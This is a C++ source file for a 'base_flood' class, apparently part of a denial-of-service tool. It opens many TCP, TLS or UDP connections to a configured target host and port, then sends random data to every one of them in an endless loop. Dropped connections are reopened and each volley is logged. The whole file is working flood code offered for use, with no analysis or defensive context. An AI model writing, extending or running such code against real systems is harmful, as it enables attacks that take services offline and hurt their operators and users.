#include "base_flood.h"
#include "utils.h"
#include "ssocket.h"

base_flood::base_flood(std::shared_ptr<Config> config, int sock_type) : Vector(std::move(config)), sock_type{sock_type}{
    
}

int base_flood::gen_hdr(std::string &string) {
    utils::randomizer::randomstr(string);
    return static_cast<int>(string.length());
}

void base_flood::init_sockets(std::vector<std::unique_ptr<Socket>> &sockets) {
    sockets.reserve(config->conn);
    for(int i = 0; i < config->conn; ++i){
        switch(sock_type){
            case SOCK_STREAM:
                if(config->tls){
                    sockets.emplace_back(std::unique_ptr<Socket>(new Ssocket(config->rhost.c_str(),
                            config->rport.c_str())));
                    break;
                }
            case SOCK_DGRAM:
                if(config->tls)
                    fputs("[-] tls is not available on udp\n", stderr);
                sockets.emplace_back(std::unique_ptr<Socket>(new Socket(config->rhost.c_str(), 
                        config->rport.c_str(), sock_type)));
                break;
            default:
                break;
        }
    }
}

void base_flood::run() {
    std::vector<std::unique_ptr<Socket>> sockets{};
    sockets.reserve(config->conn);
    std::string hdr{};
    int len = 0;
    init_sockets(sockets);

    while(true) {
        for(auto& socket : sockets) {
            if(!socket->Alive())
                socket->Open();
            len = gen_hdr(hdr);
            if(socket->Write(hdr.c_str(), len) == -1){
                socket->Close();
                socket->Open();
            }
            fputs("[+] Voly Sent\n", stderr);
        }
        utils::pause(config->time);
    }
}


